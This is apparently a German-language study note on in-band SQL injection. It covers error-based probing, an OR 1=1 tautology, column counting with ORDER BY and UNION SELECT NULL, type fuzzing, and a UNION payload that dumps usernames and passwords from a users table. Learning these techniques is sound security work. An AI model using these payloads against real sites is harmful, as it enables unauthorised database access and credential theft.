Zu unterscheiden in "Error Based" oder "Union Based".

# Error-Based
```sql
// Input
www.random.com/app.php?id =' // Das Hochkomma 
// Output
You have an error in your SQL syntax...
```
Weitere In-Band Attacken
```sql
https://insecure-website.com/products?category=Gifts'+OR+1=1--
//White-Box
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1 
```

# Union-Based
## Regeln:
- Die nummer und die Sortierung der Spalten muss in allen Queries gleich sein
- Datentypen müssen kompatibel sein

## Order by
```sql
select title, cost from product where id =1 order by 1
```
Wieviele Spalten gibt es? `order by 1 / order by 2 / ..`

## NULL Werte
```sql
select title, cost from product where id =1 UNION SELECT NULL -- 
```
### Fehlermeldung
> All querie combined usimg a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.

```sql
 UNION SELECT NULL, NULL --
 ```
## Type Fuzzing
```sql
 UNION SELECT 'a', NULL --
 UNION SELECT NULL, 'a' --
 ```
 
# Beispiele
## Data-Dump
```sql
SELECT name, description FROM products WHERE category = 'Gifts'
// Attacker
' UNION SELECT username, password FROM users-- 
```
